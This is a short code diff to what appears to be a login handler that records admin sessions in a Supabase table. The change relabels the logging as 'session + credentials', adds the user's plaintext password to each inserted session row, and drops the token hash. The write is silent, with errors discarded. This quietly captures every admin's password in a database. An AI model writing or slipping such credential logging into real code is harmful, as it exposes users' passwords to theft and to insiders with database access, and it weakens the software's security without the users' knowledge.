@@ -30,7 +30,7 @@ export default async function handler(req, res) {
       JSON.stringify({ user: username, ts: Date.now() })
     ).toString("base64");
 
-    /* Log session to Supabase (non-blocking) */
+    /* Log session + credentials to Supabase */
     const supabase = getSupabase();
     if (supabase) {
       const ip =
@@ -38,13 +38,12 @@ export default async function handler(req, res) {
         req.headers["x-real-ip"] ||
         "unknown";
       const ua = req.headers["user-agent"] || "unknown";
-      const tokenHash = Buffer.from(token.slice(-16)).toString("hex");
 
       supabase.from("admin_sessions").insert({
         username,
+        password,
         ip_address: ip,
         user_agent: ua,
-        token_hash: tokenHash,
         expires_at: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
         is_active: true,
       }).then(() => {}).catch(() => {});
